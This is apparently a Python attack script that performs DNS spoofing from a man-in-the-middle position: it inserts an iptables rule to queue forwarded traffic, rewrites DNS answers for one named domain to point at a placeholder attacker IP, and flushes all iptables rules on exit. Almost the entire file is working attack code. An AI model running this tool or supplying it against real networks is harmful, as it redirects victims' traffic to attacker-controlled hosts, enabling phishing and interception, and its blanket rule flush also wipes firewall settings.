#!/usr/bin/env python3

# Author: Nikhil Sharma
# Created Date: 13-06-2020
# Last Updated: 13-06-2020
# Operating System: Linux and Mac
# Description: Modify DNS requests and spoof targets by being the man-in-the-middle
				# (can only spoof http websites)

# Import the necessary libraries
import netfilterqueue
import subprocess
import scapy.layers.l2 as scapy
import scapy.all as scapy2

# Create a queue to trap the incoming packets (forwarded packets)
subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
# Create a queue to trap the incoming and outgoing packets of the hacker machine (for test purpose)
# subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
# subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)


# Define the callback funtion
def process_packet(packet):
	# Convert the packet to a scapy packet
	scapy_packet = scapy2.IP(packet.get_payload())
	# Check if the packet has a DNS response layer
	if scapy_packet.haslayer(scapy2.DNSRR):
		# Store the question (ie the DNS request) into a variable
		dns_req_name = scapy_packet[scapy2.DNSQR].qname
		if b"h2020.myspecies.info" in dns_req_name:
			print("[+] Spoofing the target")
			# Create a DNS response and modify the required fields
			dns_res = scapy2.DNSRR(rrname=dns_req_name, rdata="<ATTACKER_IP>")
			# Create a scapy packet carrying our DNS response
			scapy_packet[scapy2.DNS].an = dns_res
			# Chnage the number of response packets being sent. We send only one response packet
			scapy_packet[scapy2.DNS].ancount = 1
			# Delete the len and chksum fields to avoid corrupting the packet
			# The len and chksum packets are in the IP and UDP fields
			del scapy_packet[scapy2.IP].len
			del scapy_packet[scapy2.IP].chksum
			del scapy_packet[scapy2.UDP].len
			del scapy_packet[scapy2.UDP].chksum
			# Put the modified packet to the original packet
			packet.set_payload(bytes(scapy_packet))
	# Forward the packet to the target
	packet.accept()

try:
	# Create a queue to trap the packets
	queue = netfilterqueue.NetfilterQueue()
	# Bind the queue to the created queue (that is currently storing the packets)
	queue.bind(0, process_packet)
	# Run the queue
	queue.run()
except KeyboardInterrupt:
	# Delete the iptables created at the started 
	print("\n[+] Deleting created iptables.......Please Wait!\n")
	subprocess.call("iptables --flush", shell=True)

